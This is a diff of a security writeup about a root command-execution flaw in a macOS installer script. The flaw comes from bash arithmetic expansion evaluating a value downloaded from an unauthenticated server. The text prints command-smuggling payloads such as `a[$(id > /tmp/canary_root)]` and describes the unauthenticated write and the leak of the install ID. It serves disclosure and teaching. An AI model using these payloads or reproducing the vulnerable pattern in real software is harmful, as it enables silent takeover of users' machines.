@@ -25,131 +25,47 @@ takeaways:
   - "If a script asks a server for data, always ask yourself who can write to that server."
 ---
 
-This was my first published writeup, and I picked the finding I learned the most from: a
-command execution **as root** on the Mac of any user of a fairly well-known desktop
-application, caused by something that looks harmless at a glance — adding one to a number.
-
-I am going to tell it from the beginning and assume nothing. If you have never touched bash
-in your life, you should still be able to follow. If you have, you will see the pattern and
-struggle not to look for it everywhere from now on.
-
-<div class="warn" markdown="1">
-**Everything is anonymised.** The program authorised publication on condition the product
-is not identifiable. I have changed the vendor name, the kind of product, the hosts, the
-version numbers and the field names. **The mechanism, the code and the chain are exact**:
-the only thing you will not find here is who it happened to.
-</div>
-
-## What you will learn
-
-1. Why desktop installers are a great place to look.
-2. What `$(( ))` really does in bash and why it is an interpreter in disguise.
-3. How to trace a value backwards until you find who controls it.
-
-## Why I looked at an installer
-
-When you install a `.pkg` on macOS, the system can run two scripts: `preinstall` before
-copying files and `postinstall` afterwards. If the package asks for it, those scripts run
-**as root**, the user with total control of the machine.
-
-When you hit "Install" and type your password, you are not just copying
-files. You are letting a script written by someone else run whatever it likes on your
-computer with administrator privileges. Normally that script does boring, legitimate
-things. But if someone manages to slip an order into it, that order runs with those same
-privileges.
-
-And the best part: **an installer is a public file**. You download it, open it and read the
-code. No account needed, nothing to attack, not a single odd request sent. It is one of the
-few surfaces where you can read the target's source code before touching it:
+A macOS `.pkg` can run two scripts when it installs, `preinstall` and `postinstall`, and if
+the package asks for it they run **as root**. An installer is also a public file: you
+download it and read the code that is about to run with full privileges on thousands of
+machines.
 
 ```bash
-# a .pkg is an archive with a known structure
-pkgutil --expand-full installer.pkg /tmp/installer-open
-
-# and the scripts are right there, in plain text
-cat /tmp/installer-open/*.pkg/Scripts/postinstall
+pkgutil --expand-full installer.pkg /tmp/opened
+cat /tmp/opened/*.pkg/Scripts/postinstall
 ```
 
-That is all. Two commands and you are reading the code that will run as root on thousands
-of people's computers.
-
-## The line that made me stop
-
-Reading the `postinstall` I found this:
+## The line
 
 ```bash
 # prepare data for feedback server
 new_installation_count=$((install_count + 1))
 ```
 
-An addition. The most harmless thing in the world. And yet that is where I stopped, for a
-reason that deserves its own section.
-
-## Masterclass: `$(( ))` does not add, it *evaluates*
-
-This is the most important part of the article. If you take one thing away, take this.
-
-In bash, `$(( ... ))` is called **arithmetic expansion**. You think you are asking it to
-"do this sum", but what you are really saying is "**evaluate** this as an expression". And
-evaluating, in bash, includes resolving whatever is inside.
-
-Try it yourself in a terminal. First, the normal case:
+An addition. But `$(( ))` in bash does not add: it **evaluates**. And evaluating includes
+running whatever it finds inside, because it allows array indexes and to resolve the index
+it has to look at what is between the brackets:
 
 ```bash
-number=5
-echo $((number + 1))      # 6
-```
-
-No surprises. Now the not-so-normal case:
-
-```bash
-number='a[$(touch /tmp/i-got-in)]'
+number='a[$(touch /tmp/gotcha)]'
 echo $((number + 1))      # 1  (the empty index is 0, plus one)
-ls -l /tmp/i-got-in       # the file exists
+ls /tmp/gotcha            # the file exists
 ```
-
-We asked bash to add one to a variable. But the variable did not hold a
-number, it held **an order**. And bash, before adding, ran the order. The sum returned a
-perfectly normal number and it looked like nothing happened — but the file is there. That
-is the whole vulnerability: in a place expecting a number you put an order, and it runs.
-
-Why does this happen? Because inside `$(( ))` bash allows array indices — `a[something]` —
-and to know which index that is, it has to **resolve** what is inside the brackets. If
-there is a `$(command)` in there, it runs it to find out the result. Command substitution
-happens *before* the arithmetic.
-
-And here is the part most people get wrong:
 
 <div class="warn" markdown="1">
-**Quotes do not protect you.** This still executes:
-
-```bash
-echo $(( "$number" + 1 ))
-```
-
-Quoting stops the shell splitting the variable into pieces, not evaluating it. Inside an
-arithmetic context **the content is evaluated anyway**. The same goes for
-`[[ "$x" -ge 10 ]]`, which plenty of people use believing it is a safe comparison.
+**Quoting does not protect you here.** `echo $(( "$number" + 1 ))` runs just the same:
+quoting stops the shell splitting the variable, not evaluating it. Same with
+`[[ "$x" -ge 10 ]]`. With a single bracket — POSIX `test` — it does not happen: you get
+"integer expression expected" and nothing runs.
 </div>
 
-Note the detail: with `[ "$x" -ge 10 ]` — **single bracket**, which is POSIX `test` — this
-does **not** happen: you get an "integer expression expected" error and nothing runs. In
-other words, the bug is not a "shell thing" in general: it is specific to `$(( ))` and
-`[[ ]]`. That nuance is exactly what separates a dangerous parameter from a harmless one.
+## Where the number came from
 
-## Where did that number come from?
-
-Fine: there is a dangerous place. The next question is not "how do I exploit it?" but
-**"who decides that value?"**. A `$(( ))` with a number the script computes itself is of no
-interest whatsoever. What is interesting is whether that number comes from outside.
-
-So I followed the variable backwards through the script, and found this:
+I traced the variable backwards:
 
 ```bash
-# the script downloads a remote record identified by install_id
 curl_data=$(curl -s "https://feedback.example.tld/v2/feedback/${install_id}?plain=1")
 
-# and parses it by hand, stripping only the double quotes
 while IFS=':' read -r name value; do
     case "$name" in
         *installCount*) install_count="${value//\"/}" ;;
@@ -157,20 +73,11 @@ while IFS=':' read -r name value; do
 done <<< "$curl_data"
 ```
 
-The installer calls a server, downloads some text, looks for a line
-containing the word `installCount` and keeps whatever is to the right of it, stripping only
-the quotes. Whatever the server put there ends up inside the variable. And that variable
-ends up inside `$(( ))`.
+The server decides it. So the question becomes who can write to that server.
 
-In other words: **the server decides the value**. Which led to the question that opened
-everything up.
+## Anyone
 
-## The question that opened everything up: who can write to that server?
-
-If only the vendor can write that record, this is an ugly but barely exploitable bug. If
-anyone can write it, it is remote command execution as root.
-
-I tried writing, with no account, no token, nothing:
+No account, no token:
 
 ```http
 POST /v2/feedback?plain=1 HTTP/2
@@ -185,17 +92,7 @@ Content-Type: application/json
 HTTP/2 200 OK
 ```
 
-Two hundred. No authentication. Anyone, from anywhere.
-
-And reading it back, the value came back **byte for byte**, nothing filtered or escaped:
-
-```http
-GET /v2/feedback/<my-canary-id>?plain=1
-```
-
-```
-custom.installCount:"a[$(id > /tmp/canary_root)]"
-```
+And reading it back, the value returned byte for byte, nothing filtered.
 
 <figure>
   <img src="{{ '/assets/img/writeups/rce-instalador-macos/02-payload-en-el-servidor.png' | relative_url }}"
@@ -203,24 +100,17 @@ custom.installCount:"a[$(id > /tmp/canary_root)]"
   <figcaption>The value, already stored on the server and read back. Where a number should be there is a command substitution: <code>a[$(…)]</code>. The base64 is an <code>id</code> and a call to my own server.</figcaption>
 </figure>
 
-## And how does the attacker know my identifier?
-
-Good question, and it is the one separating a theoretical finding from a real one. The
-`install_id` could have been an unguessable secret. It was not: the script itself pulls it
-from the **downloaded file's name** and from the metadata macOS stores about where it came
-from:
+That left the victim's `install_id`, and it was not a secret either: the script takes it
+from the downloaded file's name and from the metadata macOS attaches to it.
 
 ```bash
-# macOS stores each download's origin URL in an extended attribute
 mdls -name kMDItemWhereFroms installer_<install_id>.pkg
 ```
 
-That identifier travels glued to the installer. It is in the filename
-and in the metadata macOS attaches on download. If someone shares their installer over
-chat, a forum or an affiliate link, they are sharing the identifier. It is not a secret: it
-is a label.
+It travels glued to the installer. Anyone sharing theirs over a chat or an affiliate link
+is sharing the identifier.
 
-## The full chain
+## The chain
 
 <figure>
   <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-cadena.svg' | relative_url }}"
@@ -228,13 +118,11 @@ is a label.
   <figcaption>Nobody validates anything along the way. The value goes in as text and comes out as an order.</figcaption>
 </figure>
 
-Summed up in five steps:
-
-1. The attacker writes a malicious value to the feedback server. **No account.**
-2. The victim installs or reinstalls the application. A normal, documented action.
-3. The `postinstall`, running **as root**, downloads that value.
+1. The attacker writes the value to the feedback server. **No account.**
+2. The victim installs or reinstalls.
+3. The `postinstall`, **as root**, downloads that value.
 4. The parsing loop puts it in a variable, stripping only the quotes.
-5. `$((install_count + 1))` **evaluates** it, and the order runs as root.
+5. `$((install_count + 1))` evaluates it.
 
 <figure>
   <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-bash-evalua.png' | relative_url }}"
@@ -248,9 +136,7 @@ Summed up in five steps:
   <figcaption>A second after the install, the machine calls my listener: first it resolves the domain, then it sends the <code>POST</code>. The code ran. The source IPs are mine and are covered.</figcaption>
 </figure>
 
-## The part that unsettled me most: the victim sees nothing
-
-Reading the rest of the script I found this:
+## And the victim sees nothing
 
 ```bash
 # always exit with code 0 to not show any error in the installer
@@ -258,13 +144,8 @@ trap finish EXIT
 finish() { exit 0; }
 ```
 
-The script is programmed to always say "everything went fine", whatever
-happens. It is a convenient decision so the user never sees odd errors. But it means that
-if your order runs and breaks the script halfway, **the installer still shows a green tick**.
-The victim gets not a single hint.
-
-The script also used neither `set -u` nor `set -e`, so a malformed value did not stop it
-either.
+The script always reports success. If my command breaks the install halfway through, the
+installer still shows the green tick. It did not use `set -u` or `set -e` either.
 
 ## Impact
 
